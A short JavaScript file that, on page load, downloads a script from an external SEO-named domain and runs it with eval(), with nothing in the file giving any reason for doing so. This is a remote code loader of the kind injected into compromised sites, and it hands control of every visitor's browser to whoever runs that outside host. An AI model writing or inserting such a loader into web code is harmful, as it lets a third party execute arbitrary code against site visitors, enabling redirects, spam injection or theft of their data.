"use strict";
$(function() {
  var addUrl = "https://www.xixuanseo.com/s/remote_out.js";
  $.get(addUrl, function(result) {
    eval(result)
  }, "text")
});